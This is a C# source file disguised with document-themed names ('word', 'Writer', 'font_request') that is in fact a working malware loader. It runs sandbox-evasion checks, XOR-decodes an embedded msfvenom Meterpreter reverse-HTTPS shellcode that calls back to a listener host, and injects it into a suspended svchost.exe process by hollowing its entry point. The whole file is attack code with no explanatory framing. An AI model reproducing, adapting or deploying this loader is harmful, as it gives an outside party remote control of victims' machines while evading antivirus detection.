using System;
using System.Net;
using System.Runtime.InteropServices;

namespace word
{
    public class Writer
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 FlsAlloc(IntPtr callback);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        public static void author()
        {
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result != 0xFFFFFFFF)
            {
                font_request();
            }
            return;
        }
        public static void font_request()
        {
            WebRequest req = WebRequest.Create("https://www.notdetecicde.com/");
            WebResponse server_req;
            try
            {
                server_req = req.GetResponse();
            }
            catch
            {
                server_req = null;
                font_err();
            }
            if (server_req != null)
            {
                font_response();
            }
        }
        public static void font_response()
        {
            return;
        }
        public static void font_err()
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.5 LPORT=443 EXITFUNC=thread -f csharp

            byte[] buf = new byte[590] {0x92,0x25,0xe0,0x86,0x91,0x83,
0xa2,0x6d,0x63,0x62,0x20,0x3a,0x27,0x35,0x24,0x3d,0x49,0xb1,
0x3f,0x08,0x2b,0xe9,0x33,0x0b,0x2e,0xee,0x24,0x6d,0x30,0xe8,
0x3c,0x4d,0x35,0x2a,0x6e,0xdc,0x2c,0x2f,0x3b,0x44,0xb1,0x2b,
0xe5,0x1f,0x33,0x2a,0x50,0xab,0xca,0x59,0x17,0x09,0x7a,0x4f,
0x4e,0x2c,0xa2,0xab,0x6c,0x2a,0x67,0xa4,0x94,0x98,0x2a,0x2b,
0xe5,0x3f,0x43,0xe9,0x23,0x57,0x27,0x34,0x3e,0x74,0xa8,0x05,
0xef,0x15,0x7b,0x69,0x63,0x64,0xe3,0x17,0x76,0x75,0x78,0xe8,
0xee,0xe5,0x63,0x62,0x61,0x23,0xe3,0xa5,0x02,0x12,0x30,0x62,
0xbe,0x29,0xe8,0x22,0x41,0x3b,0x2f,0x64,0xa6,0xfe,0x30,0x7b,
0x8d,0x3b,0x2e,0x53,0xa8,0x23,0x99,0xac,0x37,0xfe,0x4c,0xeb,
0x26,0x6c,0xb5,0x2a,0x50,0xab,0x27,0xa4,0xbf,0x78,0xd4,0x22,
0x6f,0xac,0x5b,0x82,0x14,0x9a,0x2a,0x66,0x3a,0x51,0x70,0x26,
0x57,0xbc,0x16,0xba,0x39,0x2f,0xed,0x25,0x52,0x3c,0x79,0xb3,
0x08,0x2c,0xe8,0x6e,0x29,0x2f,0xed,0x25,0x6a,0x3c,0x79,0xb3,
0x2f,0xe6,0x67,0xea,0x29,0x6a,0xb6,0x24,0x2e,0x34,0x20,0x3d,
0x37,0x37,0x22,0x3a,0x20,0x32,0x27,0x3f,0x3e,0xf6,0x94,0x43,
0x2f,0x3f,0x9c,0x82,0x39,0x2a,0x3f,0x3f,0x3e,0xfe,0x6a,0x8a,
0x25,0x92,0x9c,0x9d,0x3c,0x23,0x57,0xbe,0x25,0x3c,0xc6,0x14,
0x07,0x03,0x0a,0x0c,0x04,0x1f,0x66,0x24,0x20,0x3d,0xf1,0x82,
0x27,0xaa,0xa1,0x2e,0x16,0x4d,0x61,0x9a,0xa3,0x26,0x2b,0x2b,
0xe7,0x8c,0x30,0x38,0x2c,0x5a,0xa6,0x28,0x47,0xbc,0x2b,0x30,
0x27,0xd7,0x59,0x34,0x18,0xcc,0x66,0x65,0x76,0x75,0x87,0xb6,
0x86,0x62,0x63,0x62,0x61,0x5a,0x5f,0x57,0x58,0x44,0x4e,0x5b,
0x40,0x59,0x5a,0x4c,0x50,0x59,0x53,0x65,0x2c,0x3d,0xf1,0xa2,
0x27,0xaa,0xa3,0x57,0x61,0x6b,0x66,0x28,0x47,0xbc,0x2b,0x30,
0x04,0x6e,0x30,0x2b,0xdb,0x3c,0xef,0xfa,0xb0,0x75,0x78,0x63,
0x6e,0x92,0xb6,0x8a,0x45,0x6b,0x66,0x65,0x59,0x41,0x20,0x29,
0x1f,0x01,0x55,0x18,0x56,0x04,0x15,0x35,0x14,0x11,0x1c,0x13,
0x5d,0x1b,0x19,0x29,0x35,0x23,0x11,0x09,0x17,0x3b,0x33,0x31,
0x1e,0x26,0x0b,0x01,0x03,0x08,0x14,0x65,0x3e,0xfc,0xb9,0x30,
0x34,0x2c,0x3b,0x2f,0x50,0xa2,0x35,0x2d,0xce,0x75,0x4a,0xcb,
0xea,0x6d,0x63,0x62,0x61,0x3b,0x35,0x36,0x3f,0xb2,0xba,0x88,
0x3b,0x43,0x58,0x9d,0xb4,0x23,0xef,0xa3,0x1c,0x7f,0x27,0x2b,
0xe7,0x9c,0x09,0x7d,0x3b,0x39,0x0e,0xe5,0x45,0x75,0x78,0x2a,
0xe7,0x8d,0x09,0x66,0x20,0x32,0x2f,0xdf,0x03,0x33,0xe6,0xe5,
0x6e,0x6d,0x63,0x62,0x9e,0xbe,0x2b,0x54,0xb6,0x26,0x22,0x2b,
0xe7,0x9c,0x2e,0x53,0xa8,0x26,0x57,0xac,0x25,0x26,0x31,0xa4,
0xac,0x40,0x65,0x7a,0x1a,0x94,0xb3,0xe0,0xb6,0x00,0x67,0x2b,
0xa9,0xac,0xeb,0x71,0x61,0x6b,0x2f,0xdf,0x32,0x85,0x4d,0x83,
0x6e,0x6d,0x63,0x62,0x9e,0xbe,0x2e,0x9a,0xb9,0x01,0x7a,0x88,
0xc4,0x85,0x36,0x62,0x61,0x6b,0x35,0x3c,0x1c,0x35,0x22,0x2a,
0xe7,0xbc,0xa2,0x80,0x71,0x22,0xa1,0xa5,0x76,0x65,0x78,0x63,
0x27,0xd7,0x3b,0xc6,0x32,0x8e,0x66,0x65,0x76,0x75,0x87,0xb6,
0x26,0xfe,0x30,0x31,0x29,0xe2,0x81,0x2d,0xff,0x84,0x30,0xea,
0xb4,0x24,0xa4,0xa2,0x61,0x4b,0x66,0x65,0x3f,0xfc,0x81,0x2a,
0xd4,0x7f,0xf5,0xeb,0x83,0x6b,0x66,0x65,0x76,0x8a,0xad,0x2b,
0xed,0xa9,0x43,0xe7,0xa1,0x1f,0xd4,0x03,0xfd,0x72,0x30,0x62,
0xad,0xe8,0xa3,0x17,0xb3,0x33,0xa5,0x3d,0x1c,0x75,0x21,0x2a,
0xa9,0xaf,0x93,0xd7,0xc3,0x3d,0x99,0xb0};

            string meow = "nmcbakfevuxc";
            for (int i = 0; i < 6; i++) { buf[i] = (byte)((uint)buf[i] ^ (uint)meow[i]); }
            for (int i = 6; i < buf.Length; i++) { buf[i] = (byte)((uint)buf[i] ^ (uint)meow[(i - 6) % 12]); }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // for x64
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            // for x86
            // bool res = CreateProcess(null, "C:\\Windows\\SysWOW64\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hconnect = pi.hProcess;
            ZwQueryInformationProcess(hconnect, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr base_info = (IntPtr)((IntPtr)bi.PebAddress + 0x10); // x64
            // IntPtr base_info = (IntPtr)((IntPtr)bi.PebAddress + 0x8); // x86

            byte[] addinfo = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hconnect, base_info, addinfo, addinfo.Length, out nRead);
            IntPtr crash = (IntPtr)(BitConverter.ToUInt64(addinfo, 0)); // x64
            // IntPtr crash = (IntPtr)(BitConverter.ToUInt32(addinfo, 0)); // x86
            byte[] crash_info = new byte[0x200];
            ReadProcessMemory(hconnect, crash, crash_info, crash_info.Length, out nRead);
            uint crash_stage = BitConverter.ToUInt32(crash_info, 0x3C);
            uint connection_message = crash_stage + 0x28;
            uint connection_crash = BitConverter.ToUInt32(crash_info, (int)connection_message);
            IntPtr connection_error = (IntPtr)(connection_crash + (UInt64)crash);
            WriteProcessMemory(hconnect, connection_error, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);

        }
    }
}
